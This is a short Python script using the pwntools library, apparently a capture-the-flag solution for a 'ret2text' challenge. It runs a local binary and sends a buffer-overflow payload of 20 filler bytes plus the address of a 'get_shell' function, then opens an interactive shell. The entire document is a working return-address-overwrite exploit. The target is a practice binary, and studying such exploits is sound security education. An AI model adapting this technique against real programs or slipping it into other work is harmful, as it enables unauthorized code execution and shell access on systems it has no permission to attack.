from pwn import *
io = process("./ret2text")
elf = ELF("./ret2text")
io.recv()
payload = b"A"*20+p32(elf.sym["get_shell"])

io.sendline(payload)
io.interactive()
